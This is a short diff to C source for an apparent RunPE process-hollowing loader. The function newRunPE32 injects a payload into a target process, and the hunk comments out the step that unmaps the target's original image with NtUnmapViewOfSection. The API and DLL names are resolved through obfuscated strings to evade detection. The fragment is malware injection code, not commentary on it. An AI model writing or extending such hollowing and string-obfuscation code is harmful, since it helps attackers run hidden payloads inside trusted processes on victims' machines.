@@ -106,13 +106,13 @@ void newRunPE32(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 	}
 			
 	// Unmap old target process image (always)		
-	callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(deobfuscate(obfuscatedNtDll, 10, 0x56)), deobfuscate(obfuscatedNtUnmapViewOfSection, 21, 0x45)));
-	if(callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) oldTargetImageBase) == ERROR_SUCCESS) {
-		printf("Unmapped old target process image.\n");
-	} else {
-		printf("Failed to unmap old target process image.\n");
-		return;
-	}	
+	//callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(deobfuscate(obfuscatedNtDll, 10, 0x56)), deobfuscate(obfuscatedNtUnmapViewOfSection, 21, 0x45)));
+	//if(callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) oldTargetImageBase) == ERROR_SUCCESS) {
+	//	printf("Unmapped old target process image.\n");
+	//} else {
+	//	printf("Failed to unmap old target process image.\n");
+	//	return;
+	//}	
 	
 	desiredPayloadImageBase = payloadNtHeader->OptionalHeader.ImageBase;
 	printf("Desired image base of payload is 0x%lX\n", payloadNtHeader->OptionalHeader.ImageBase);	
